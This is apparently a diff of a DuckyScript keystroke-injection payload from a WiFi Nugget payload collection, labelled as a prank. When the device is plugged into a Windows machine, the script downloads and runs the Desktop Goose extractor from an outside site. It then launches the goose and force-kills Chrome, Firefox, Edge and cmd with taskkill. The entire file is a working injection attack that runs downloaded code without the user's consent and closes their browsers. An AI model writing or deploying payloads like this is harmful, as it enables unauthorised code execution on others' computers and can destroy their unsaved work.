@@ -1,50 +1,44 @@
 REM Title: Desktop Goose
 REM Description: Executes Desktop Goose 
 REM Target: Windows 10/11
-REM Version:	1.0
+REM Version:	1.1
 REM Category:	Prank
 REM Author: AfterPacket
 REM Source:        https://github.com/AfterPacket/Wifi-Nugget-Payloads
 
-GUI r
-REM Run Attack
-STRING   https://www.snapfiles.com/directdl/DesktopGoose%20v0.3%20Extractor.exe
-ENTER
-DELAY 500
+
 
 GUI r
-String cmd.exe
+DELAY 100
+STRING https://www.snapfiles.com/directdl/DesktopGoose%20v0.3%20Extractor.exe
 ENTER
-DELAY 700
-String CD "%UserProfile%\Downloads
-ENTER
-Delay 200
-STRING "DesktopGoose v0.3 Extractor.exe"
-ENTER
-Delay 700
-ENTER
-DELAY 600
-
+DELAY 5000
 GUI r
-STRING cmd.exe
-ENTER
+DELAY 100
+STRING cmd
 ENTER
 DELAY 1000
-STRING CD "%UserProfile%\Downloads\"DesktopGoose v0.3"
+STRING cd %UserProfile%\Downloads
 ENTER
-DELAY 200
+STRING "DesktopGoose v0.3 Extractor.exe"
+ENTER
+DELAY 1000
+ENTER
+DELAY 5000
+STRING cd "%UserProfile%\Downloads\DesktopGoose v0.3"
+ENTER
+DELAY 1000
 STRING GooseDesktop.exe
-Enter
-DELAY 200
-GUI r
-STRING cmd.exe
 ENTER
-DELAY 200
+DELAY 3000
 STRING taskkill /f /im chrome.exe
-Enter
+ENTER
+DELAY 1000
 STRING taskkill /f /im firefox.exe
-Enter
+ENTER
+DELAY 1000
 STRING taskkill /f /im edge.exe
-Enter
+ENTER
+DELAY 1000
 STRING taskkill /f /im cmd.exe
-Enter
+ENTER
